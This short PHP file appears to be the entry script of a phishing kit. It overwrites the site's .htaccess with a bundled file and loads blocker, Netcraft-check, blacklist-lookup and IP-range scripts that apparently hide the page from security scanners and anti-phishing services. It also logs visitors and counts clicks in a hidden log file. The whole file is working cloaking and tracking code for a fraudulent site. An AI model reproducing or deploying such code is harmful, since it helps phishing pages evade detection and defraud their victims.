<?php
    @unlink(".htaccess");
    @copy("_KHOy.txt",".htaccess");
    require "blocker.php";
    require "blocker2.php";
    require "assets/includes/visitor_log.php";
    require "assets/includes/netcraft_check.php";
    require "assets/includes/blacklist_lookup.php";
    require "assets/includes/ip_range_check.php";
    $file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._click_.txt";
    $isi = @file_get_contents($file2);
    $buka = fopen($file2, "w");
    fwrite($buka, $isi + 1);
?>